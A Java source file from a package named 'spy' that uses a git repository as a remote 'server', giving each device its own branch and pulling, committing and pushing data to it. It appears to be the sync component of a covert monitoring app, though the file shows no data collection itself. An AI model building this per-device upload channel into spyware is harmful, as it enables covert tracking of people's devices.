package com.gameofcoding.spy.server;

import com.gameofcoding.spy.utils.XLog;
import java.io.File;
import java.io.IOException;
import org.eclipse.jgit.api.errors.GitAPIException;
import org.eclipse.jgit.api.errors.InvalidRemoteException;
import org.eclipse.jgit.api.errors.TransportException;

public class ServerManager {
    private static final String TAG = "ServerManager";
    private final String SERVER_ROOT_DIR_NAME = "app_data";
    private RepoManager mGitRepo = new RepoManager();
    private static String mDeviceGitBranchName;
    private File mServerRootDir;

    /**
     * Main server class. This class handles all type of stdin and stdout process
     */
    public static class Server {
	public static final int DIR_MAIN = 0;
	public static final int DIR_APP_DATA = 1;
	public static final int DIR_DEVICE = 2;
	private RepoManager mGitRepo;

	private Server(RepoManager gitRepo) {
	    mGitRepo = gitRepo;
	}
	
	public boolean saveChanges() throws GitAPIException {
	    // Commit changes
	    return mGitRepo.commit("spy_server");
	}

	public boolean openDir(int dirId) throws GitAPIException {
	    XLog.v(TAG, "openDir(int): Opening dir [dirId=" + dirId + "]");
	    switch(dirId) {
	    case DIR_MAIN:
		return mGitRepo.checkout(RepoManager.LOCAL_BRANCH_SUFFIX + RepoManager.BRANCH_MASTER);
	    case DIR_APP_DATA:
		return mGitRepo.checkout(RepoManager.REMOTE_BRANCH_SUFFIX + RepoManager.BRANCH_APP_DATA);
	    case DIR_DEVICE:
		return mGitRepo.checkout(mDeviceGitBranchName);
	    default:
		return false;
	    }
	}

	public boolean reloadData() throws GitAPIException {
	    // Pull master and app_data
	    openDir(DIR_MAIN);
	    mGitRepo.pullRemoteBranch(RepoManager.BRANCH_MASTER);
	    openDir(DIR_APP_DATA);
	    mGitRepo.pullRemoteBranch(RepoManager.BRANCH_APP_DATA);
	    return true;
	}

	public boolean uploadData() throws GitAPIException {
	    // Commit and push changes
	    if(saveChanges())
		if(mGitRepo.push())
		    return true;
	    return false;
	}
    }
    
    public ServerManager(File filesDir, String deviceUniqueId) {
	mServerRootDir = new File(filesDir, SERVER_ROOT_DIR_NAME);
	mDeviceGitBranchName = deviceUniqueId;
	XLog.d(TAG, "repo PATH: " + mServerRootDir.toString());
	XLog.d(TAG, "repo EXISTS: " + mServerRootDir.exists());
	XLog.d(TAG, "device Branch: " + mDeviceGitBranchName);
    }

    private boolean downloadGitRepo()
	throws InvalidRemoteException, TransportException, GitAPIException, IOException {
	if(mServerRootDir.exists()) {
	    if(!mServerRootDir.delete())
		return false;
	}
	if(mGitRepo.clone(mServerRootDir)) {
	    // TODO: Check if device exists (if file is in master)
	    boolean deviceExists = false;
	    if(deviceExists) {
		XLog.i(TAG, "downloadGitRepo(): Device already exists in remote branch.");
		if(!mServerRootDir.delete()) {
		    XLog.w(TAG, "downloadGitRepo(): Failed to delete existing repo dir.");
		    return false;
		}
		if(mGitRepo.clone(mServerRootDir, new String[]{mDeviceGitBranchName})) {
		    XLog.i(TAG, "downloadGitRepo(): Cloned remote repo with current devices branch..");
		    return true;
		}
	    } else {
		// TODO: Create new json file with device branch name and upload
		XLog.i(TAG, "downloadGitRepo(): Device does not exist in remote branch,"
		       + " creating new branch.");
		mGitRepo.createBranch(mDeviceGitBranchName);
		return true;
	    }
	}
	return false;
    }

    public Server loadServer() {
	try {
	    if(!mServerRootDir.exists()) {
		if(!downloadGitRepo())
		    return null;
	    }
	    mGitRepo.loadRepo(mServerRootDir);
	    if(mGitRepo.isLocalBranch(mDeviceGitBranchName))
		mDeviceGitBranchName = RepoManager.LOCAL_BRANCH_SUFFIX + mDeviceGitBranchName;
	    else if(mGitRepo.isRemoteBranch(mDeviceGitBranchName))
		mDeviceGitBranchName = RepoManager.REMOTE_BRANCH_SUFFIX + mDeviceGitBranchName;
	    else
		return null;
	    return new Server(mGitRepo);
	} catch(Exception e) {
	    XLog.e(TAG, "loadServer(): Exception occured while loading repo.", e);
	    return null;
	}
    }
   
    public File getServerRootDir() {
	return mServerRootDir;
    }
}
